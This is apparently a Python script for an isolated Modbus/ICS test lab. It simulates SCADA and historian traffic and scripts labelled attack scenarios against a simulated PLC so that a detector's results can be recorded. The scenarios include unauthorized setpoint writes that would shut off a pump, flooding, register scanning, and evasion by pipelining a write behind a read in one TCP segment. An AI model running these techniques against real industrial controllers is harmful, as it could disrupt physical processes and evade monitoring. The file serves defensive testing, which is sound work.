# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Ciberfox contributors
"""Actores del laboratorio (cada uno corre dentro de su namespace). DATOS SIMULADOS.

Subcomandos: scada, historian, listen, probe, latency, attack.
Los ataques solo se dirigen a 192.0.2.20 dentro del laboratorio aislado.
"""
import argparse
import json
import random
import socket
import statistics
import struct
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from modbus import Client, ModbusError  # noqa: E402

PLC = "192.0.2.20"


def connect_retry(src, tries=50):
    for _ in range(tries):
        try:
            return Client(PLC, source=src)
        except OSError:
            time.sleep(0.2)
    raise SystemExit(f"{src}: no se pudo conectar al PLC")


def scada(args):
    """Operación normal: sondeo 1 Hz y ajustes de consigna dentro de rango cada 25 s."""
    rng = random.Random(3)
    c = connect_retry("192.0.2.10")
    end, k = time.time() + args.duration, 0
    while time.time() < end:
        try:
            c.read_input(0, 5)
            c.read_holding(100, 1)
            if k and k % 25 == 0 and k < 100:   # ajustes rutinarios solo al inicio
                c.write_register(100, rng.randint(38, 42))
        except (ModbusError, OSError):
            pass
        k += 1
        time.sleep(1.0)


def historian(args):
    c = connect_retry("192.0.2.11")
    end = time.time() + args.duration
    while time.time() < end:
        try:
            c.read_input(0, 5)
        except (ModbusError, OSError):
            pass
        time.sleep(5.0)


def listen(args):
    """Servicio ficticio de un host (HMI, SSH simulado, HTTPS simulado...)."""
    socks = []
    for spec in args.bind:
        host, port = spec.rsplit(":", 1)
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, int(port)))
        s.listen(64)
        socks.append(s)

    def loop(s):
        while True:
            conn, _ = s.accept()
            conn.close()
    for s in socks:
        threading.Thread(target=loop, args=(s,), daemon=True).start()
    while True:
        time.sleep(3600)


def probe(args):
    """Intenta TCP connect a cada servicio del inventario; imprime JSON de alcanzables."""
    targets = json.loads(args.targets)
    out = []
    for name, host, port in targets:
        s = socket.socket()
        s.settimeout(0.4)
        try:
            s.bind((args.src, 0))
            s.connect((host, port))
            ok = True
        except OSError:
            ok = False
        finally:
            s.close()
        out.append({"dst": name, "host": host, "port": port, "reachable": ok})
    print(json.dumps(out))


def latency(args):
    c = connect_retry("192.0.2.10")
    for _ in range(50):
        c.read_holding(100, 1)            # calentamiento
    samples = []
    for _ in range(args.n):
        t0 = time.perf_counter()
        c.read_holding(100, 1)
        samples.append((time.perf_counter() - t0) * 1000)
    samples.sort()
    print(json.dumps({"n": args.n, "median_ms": statistics.median(samples),
                      "p99_ms": samples[int(0.99 * len(samples)) - 1],
                      "mean_ms": statistics.fmean(samples)}))


# ---------------------------------------------------------------- ataques ----
def raw_pipelined(src, pdus, unit=1):
    """Varias ADU Modbus en UN solo segmento TCP (pipelining)."""
    s = socket.create_connection((PLC, 502), timeout=2, source_address=(src, 0))
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    blob = b"".join(struct.pack("!HHHB", 100 + i, 0, len(p) + 1, unit) + p for i, p in enumerate(pdus))
    s.sendall(blob)
    time.sleep(0.3)
    s.close()


ATTACKS = {
    # id: (origen, descripción, función)
    "A1": ("192.0.2.99", "Escritura FC06 desde laptop de IT (origen no autorizado)"),
    "A2": ("192.0.2.10", "SCADA comprometido: consigna de bomba a 5 % (apagar bomba)"),
    "A3": ("192.0.2.99", "Inundación: 2000 lecturas FC03 lo más rápido posible"),
    "A4": ("192.0.2.99", "Reconocimiento: barrido de registros 0–250 y unit IDs 1–10"),
    "A5": ("(sensor)", "Deriva de sensor: Ti reportada sube 0.08 K/s (no es tráfico)"),
    "A6": ("192.0.2.10", "SCADA comprometido: FC16 escribe 100–101 = [40, 300]"),
    "A7": ("192.0.2.10", "SCADA comprometido: FC06 a registro no aprobado 200"),
    "A8": ("192.0.2.11", "Historian (solo lectura) emite escritura FC06 100=40"),
    "A9": ("192.0.2.12", "Estación de ingeniería fuera de ventana de mantenimiento: FC06 100=45"),
    "A10": ("192.0.2.99", "Evasión: FC03 + FC06 100=55 en el mismo segmento TCP"),
    "A11": ("192.0.2.11", "Evasión del filtro del historian: FC04 + FC06 100=60 en un segmento"),
    "R1": ("192.0.2.10", "Operador restablece consigna a 40 % tras revisar la alerta (no es ataque)"),
}


def attack(args):
    aid = args.id
    src = ATTACKS[aid][0]
    rec = {"id": aid, "src": src, "desc": ATTACKS[aid][1], "t_start": time.time(),
           "sent": 0, "answered": 0, "errors": []}

    def do(fn):
        rec["sent"] += 1
        try:
            fn()
            rec["answered"] += 1
        except ModbusError:
            rec["answered"] += 1           # el PLC respondió con excepción
        except OSError as e:
            rec["errors"].append(type(e).__name__)

    try:
        if aid == "A5":
            flag = Path(args.flag)
            flag.touch()
            time.sleep(args.hold)
            flag.unlink()
        elif aid in ("A10", "A11"):
            rec["sent"] = 1
            first = struct.pack("!BHH", 3, 100, 1) if aid == "A10" else struct.pack("!BHH", 4, 0, 5)
            value = 55 if aid == "A10" else 60
            try:
                raw_pipelined(src, [first, struct.pack("!BHH", 6, 100, value)])
                rec["answered"] = 1
            except OSError as e:
                rec["errors"].append(type(e).__name__)
        else:
            try:
                c = Client(PLC, source=src, timeout=1.5)
            except OSError as e:
                rec["errors"].append("connect:" + type(e).__name__)
                c = None
            if c:
                if aid == "A1":
                    do(lambda: c.write_register(100, 50))
                elif aid == "A2":
                    do(lambda: c.write_register(100, 5))
                elif aid == "R1":
                    do(lambda: c.write_register(100, 40))
                elif aid == "A3":
                    for _ in range(2000):
                        do(lambda: c.read_holding(100, 1))
                elif aid == "A4":
                    for base in range(0, 251, 10):
                        do(lambda b=base: c.read_holding(b, 10))
                    for unit in range(1, 11):
                        do(lambda u=unit: c.read_holding(100, 1, unit=u))
                elif aid == "A6":
                    do(lambda: c.write_registers(100, [40, 300]))
                elif aid == "A7":
                    do(lambda: c.write_register(200, 1))
                elif aid == "A8":
                    do(lambda: c.write_register(100, 40))
                elif aid == "A9":
                    do(lambda: c.write_register(100, 45))
                c.close()
    finally:
        rec["t_end"] = time.time()
        with open(args.truth, "a") as f:
            f.write(json.dumps(rec) + "\n")


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    for name in ("scada", "historian"):
        p = sub.add_parser(name)
        p.add_argument("--duration", type=float, required=True)
    p = sub.add_parser("listen")
    p.add_argument("--bind", nargs="+", required=True)
    p = sub.add_parser("probe")
    p.add_argument("--src", required=True)
    p.add_argument("--targets", required=True)
    p = sub.add_parser("latency")
    p.add_argument("--n", type=int, default=2000)
    p = sub.add_parser("attack")
    p.add_argument("id", choices=sorted(ATTACKS))
    p.add_argument("--truth", required=True)
    p.add_argument("--flag", default="")
    p.add_argument("--hold", type=float, default=40)
    args = ap.parse_args()
    {"scada": scada, "historian": historian, "listen": listen, "probe": probe,
     "latency": latency, "attack": attack}[args.cmd](args)


if __name__ == "__main__":
    main()
